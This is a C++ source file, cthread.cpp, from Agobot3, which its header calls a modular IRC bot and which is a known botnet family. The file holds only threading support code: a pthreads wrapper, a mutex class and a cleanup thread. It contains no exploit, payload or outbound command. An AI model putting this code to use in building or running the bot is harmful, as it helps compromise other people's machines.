/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "cthread.h"
#include "mainctrl.h"

// I cna cdoe 800 sytnxa rerros pre mniuet!!!

// Volatile pthreads refcount
int volatile g_iRefCount=0;

// Global that is set if PThreads is initialized
bool g_bPThreadsInited=false;

// Number of threads currently running
int volatile g_iNumThreads=0;

CThread::CThread() {
	// Set the dynamic state to false
	m_bDynamic=true;
	m_bRunning=false;
	m_bRestart=false;
	m_szType="CThread";
	CThread::InitPThreads();
}

CThread::~CThread() {
	try {
		// Kill the thread in case its still running
		if(m_bRunning)
		{
			m_bRunning=false;
			m_mRunning.Unlock();

			// Join the thread
			pthread_join(m_tThread, NULL); }
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::~CThread(cthread.cpp): Kill() caused an exception.\n");
#endif // DBGCONSOLE
	}
	CThread::CleanupPThreads();
}

void CThread::InitPThreads() {
#ifdef WIN32
	if(!g_iRefCount) {
		pthread_win32_process_attach_np();
		pthread_win32_thread_attach_np();
		g_bPThreadsInited=true;
		g_iRefCount++;
	}
	else
		g_iRefCount++;
#else
#endif // WIN32
}

void CThread::CleanupPThreads() {
#ifdef WIN32
	if(g_iRefCount>1)
		g_iRefCount--;
	else {
		g_iRefCount--;
		pthread_win32_process_detach_np();
		pthread_win32_thread_detach_np();
	}
#else
#endif // WIN32
}

bool CThread::Start(bool bDynamic, bool bRestart, bool bRealtime) {
	m_bDynamic=bDynamic; m_bRestart=bRestart;
	try {
		sched_param pParams;
		pthread_attr_init(&m_aAttr);
		pthread_attr_setinheritsched(&m_aAttr, PTHREAD_EXPLICIT_SCHED);
		if(bRealtime)
			pParams.sched_priority=THREAD_PRIORITY_HIGHEST;
		else
			pParams.sched_priority=THREAD_PRIORITY_NORMAL;
		pthread_attr_setschedparam(&m_aAttr, &pParams);

		if(!pthread_create(&m_tThread, &m_aAttr, &this->RunWrapper, this))
		{	m_mRunning.Lock(); m_bRunning=true; return true; }
		else
		{	m_mRunning.Unlock(); m_bRunning=false; return false; }

#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif

#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::Start(cthread.cpp): pthread_create caused an exception.\n");
#endif // DBGCONSOLE
		m_mRunning.Unlock(); m_bRunning=false; return false;

	}
}

void CThread::Kill() {
/*	try {
		if(m_bRunning) {
			// Cancel the thread
			pthread_cancel(m_tThread);
			m_bRunning=false;
			m_mRunning.Unlock();
		}
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::Kill(cthread.cpp): Exception thrown (%s).\n", m_szType);
#endif // DBGCONSOLE
	}
	*/
}

int CThread::Join() {
	try {
		// Join the thread
		if(m_bRunning)
		{	m_bRunning=false;
			m_bRestart=false;
//			pthread_cancel(m_tThread);
			return pthread_join(m_tThread, NULL); }
		else
			return 0;
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::Join(cthread.cpp): Exception thrown (%s).\n", m_szType);
#endif // DBGCONSOLE
	}

	return 0;
}

void *CThread::RunWrapper(void *pArgs) {
	CThread *pThread=(CThread*)pArgs;
	sched_setscheduler(NULL, SCHED_FIFO);

	while(true)
	{
		try {
			g_iNumThreads++;

			// Call the pure virtual of the thread function
			pThread->Run();

			g_iNumThreads--;

#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
#endif
			g_iNumThreads--;
#ifdef DBGCONSOLE
			if(g_pMainCtrl) {
				if(pThread->m_bRestart)
					g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): Thread caused an exception, restarting.\n");
				else
					g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): Thread caused an exception, exiting.\n");
			}
#endif // DBGCONSOLE
		}
		if(!pThread->m_bRestart) break;
	}

#ifdef DBGCONSOLE
	if(pThread->m_szType)
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): %s thread exiting (%d threads).\n", pThread->m_szType, g_iNumThreads);
	else
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): Unnamed thread exiting (%d threads).\n", g_iNumThreads);
#endif // DBGCONSOLE

	pThread->m_bRunning=false;
	if(pThread->m_bDynamic) g_pCleanupThread->Schedule(pThread);
	pThread->m_mRunning.Unlock();
	return NULL;
}

CMutex::CMutex() {
	CThread::InitPThreads();
	// Initialize the mutex
	pthread_mutex_init(&m_mMutex, NULL);
}

CMutex::~CMutex() {
	CThread::CleanupPThreads();
	// Destroy the mutex
	pthread_mutex_destroy(&m_mMutex);
}

void CMutex::Lock() {
	// Lock the mutex
	pthread_mutex_lock(&m_mMutex);
}

void CMutex::Unlock() {
	// Unlock the mutex
	pthread_mutex_unlock(&m_mMutex);
}

CCleanupThread::CCleanupThread()
{
	m_szType="CCleanupThread";
}

void *CCleanupThread::Run()
{	while((g_iRefCount || !m_lQueue.empty()) && m_bRunning)
	{	Cleanup(); Sleep(2000); }
	return NULL; }

void CCleanupThread::Schedule(CThread *pThread)
{	if(pThread==this) return;

	m_mLock.Lock();
	try {
		m_lQueue.push_back(pThread);
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CCleanupThread: Schedule() got invalid value 0x%.8X.\n", pThread);
#endif // DBGCONSOLE
	}
	m_mLock.Unlock(); }

void CCleanupThread::Cleanup()
{	try {
		m_mLock.Lock(); list<CThread*>::reverse_iterator it;
		for(it=m_lQueue.rbegin(); it!=m_lQueue.rend(); ++it)
		{	
			CThread *pThread=(*it);
			try {
				bool bBla=pThread->m_bDynamic;
#ifdef DBGCONSOLE
				if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CCleanupThread: Cleaning up \"%s\".\n", pThread->m_szType);
#endif // DBGCONSOLE

				if(pThread->m_bDynamic) delete pThread;
				else {
					pThread->Kill();
					pThread->Join();
				}
#ifdef PtW32CatchAll
			} PtW32CatchAll {
#else
			} catch(...) {
#endif
#ifdef DBGCONSOLE
				if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CCleanupThread: m_lQueue contained invalid value.\n");
#endif // DBGCONSOLE
			}
		}
		m_lQueue.clear(); m_mLock.Unlock();
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CCleanupThread: m_lQueue invalid.\n");
#endif // DBGCONSOLE
	}
}
